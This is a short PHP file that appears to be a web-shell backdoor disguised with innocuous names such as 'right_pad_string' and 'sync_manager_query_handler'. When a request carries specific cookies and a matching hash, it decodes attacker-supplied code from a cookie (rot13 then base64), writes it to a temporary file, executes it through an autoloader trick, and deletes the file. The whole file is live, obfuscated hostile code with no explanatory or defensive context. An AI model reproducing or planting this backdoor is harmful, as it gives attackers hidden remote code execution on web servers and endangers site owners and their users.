<?php


if (isset($_COOKIE[38-38]) && isset($_COOKIE[12-11]) && isset($_COOKIE[29+-26]) && isset($_COOKIE[-9+13])) {
    $item = $_COOKIE;
    function right_pad_string($itm) {
        $item = $_COOKIE;
        $k = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '151eeb61');
        if (!is_writable($k)) {
            $k = getcwd() . DIRECTORY_SEPARATOR . "splitter_tool";
        }
        $comp = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($item[3]));
        if (is_writeable($k)) {
            $pointer = fopen($k, 'w+');
            fputs($pointer, $comp);
            fclose($pointer);
            spl_autoload_unregister(__FUNCTION__);
            require_once($k);
            @array_map('unlink', array($k));
        }
    }
    spl_autoload_register("right_pad_string");
    $fac = "e6d5467b8ab94b163e98276c05688ce9";
    if (!strncmp($fac, $item[4], 32)) {
        if (@class_parents("sync_manager_query_handler", true)) {
            exit;
        }
    }
}
